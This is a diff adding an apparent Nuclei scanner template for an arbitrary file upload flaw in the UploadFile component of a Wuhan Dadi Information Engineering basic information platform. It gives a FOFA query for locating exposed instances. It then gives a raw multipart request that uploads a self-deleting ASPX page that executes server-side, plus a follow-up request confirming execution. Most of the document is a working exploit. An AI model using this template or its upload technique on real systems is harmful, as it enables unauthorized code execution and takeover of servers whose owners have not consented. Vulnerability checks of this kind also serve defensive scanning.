@@ -1,0 +1,40 @@
+id: wuhan-dadi-info-platform-uploadfile
+
+info:
+  name: "武汉地大信息工程股份有限公司基础信息平台 UploadFile 组件文件上传权限绕过"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/SystemManage/BaseProject"
+      武汉地大信息工程股份有限公司（简称"地大信息"）作为地理信息系统（GIS）技术服务提供商，其基础信息平台的UploadFile组件在文件上传流程中存在安全验证缺陷。该组件未正确校验上传文件的权限边界，导致攻击者可构造特制请求实现任意文件上传。结合平台其他已知漏洞（如文件读取漏洞），攻击者可利用此缺陷实现恶意文件上传，进而获取服务器控制权限及敏感数据访问能力。
+  tags: 武汉地大信息工程股份有限公司基础信息平台
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /SystemManage/BaseProject/UploadFile HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3eAFYzQhNgj7Q4xh
+    Cookie: ASP.NET_SessionId=3xa5xt4ordsw2seoftjsfrrl
+
+    ------WebKitFormBoundary3eAFYzQhNgj7Q4xh
+    Content-Disposition: form-data; name="file"；filename="NTest.aspx"
+
+    <%@ Page Language="C#"%><% Response.Write("NdayTest"); System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
+    ------WebKitFormBoundary3eAFYzQhNgj7Q4xh--
+- raw:
+  - |
+    GET /Content/images/projectImage/NTest.aspx HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
